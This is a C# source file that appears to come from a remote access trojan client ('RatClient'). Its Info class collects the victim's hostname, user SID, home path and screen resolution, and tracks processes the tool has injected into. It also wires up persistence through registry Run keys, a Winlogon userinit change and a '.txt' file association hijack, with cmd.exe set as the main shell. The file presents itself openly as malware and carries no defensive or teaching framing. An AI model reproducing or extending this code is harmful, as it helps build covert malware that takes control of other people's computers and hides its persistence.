using System;
using System.IO;
using System.Collections.Generic;
using System.IO.Compression;
using System.Runtime.Serialization;
using RatClient.ProcManage;
using System.Diagnostics;
using System.Reflection;
using RatClient.Persistence;

class Info
{
    public static string CurrentexecutablePath = Assembly.GetEntryAssembly().Location;
     
    [DataContract]
    public class ClientInfo
    {
        [DataMember]
        public string Hostname { get; set; } = System.Net.Dns.GetHostName();
        [DataMember]
        public string StartTime { get; set; } = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
    }

    public class UserInfo
    {
        public static string userSid = Tools.GetUserSid();
        public static string UserHomePath = Tools.HomePath();
    }

    private static int[] screenres = Tools.GetResolution();

    public class Resoulution
    {
        public static int Width = screenres[0];
        public static int Height = screenres[1];
    }

    public static readonly Dictionary<string, Func<MemoryStream, Stream>> AlgorithmsCompress = new Dictionary<string, Func<MemoryStream, Stream>>
    {
        { "gzip", (ms) => new GZipStream(ms, CompressionMode.Compress) },
        { "zlib", (ms) => new DeflateStream(ms, CompressionMode.Compress) }
    };

    public static readonly Dictionary<char, Func<int, int>> GetmilisecRange = new Dictionary<char, Func<int, int>>
    {
        {'s', num => num * 1000 },
        {'m', num => (num * 60) * 1000},
        {'h', num => ((num * 60) * 60) * 1000 }
    };

    public static List<string> InjectedProcess = new List<string> ();

    public static void AddInjectProcess(int pid)
    {
        try
        {
            Process proc = Process.GetProcessById(pid);
            string identifier = ProcInfo.GenIdentifier(proc);
            InjectedProcess.Add(identifier);
        }
        catch
        {

        }
    }

    public static readonly Dictionary<string, Func<string, bool>> PersistActionsReg = new Dictionary<string, Func<string, bool>>
    {
        { "runlocalmachine", (name) => Registrys.RunLocalMachine(name) },
        { "runlocaluser", (name) => Registrys.RunLogonUser(name) },
        { "wininit", (_) => Registrys.WinLogonUserInit() },
        { "txthijack", (_) => Registrys.PersistTxtfile() }
    };

    public static string MainShell = "cmd.exe";
}

